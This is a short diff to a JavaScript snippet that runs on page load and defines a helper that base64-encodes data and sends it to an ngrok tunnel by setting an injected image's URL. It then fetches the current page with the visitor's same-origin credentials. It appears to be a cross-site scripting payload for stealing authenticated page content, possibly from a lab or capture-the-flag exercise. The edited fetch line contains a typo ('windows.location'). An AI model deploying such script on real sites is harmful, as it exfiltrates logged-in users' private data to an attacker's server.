@@ -1,12 +1,12 @@
 window.addEventListener('load', function () {
  function send2server(name, data){
     img = document.createElement("img");
-    img.src = "https://392445a8.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
+    img.src = "https://392445a8.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
     document.getElementById("chat-div").appendChild(img);
 }
 
 
-  fetch('/',
+  fetch(windows.location.pathname,
         {
    credentials: "same-origin"
   })
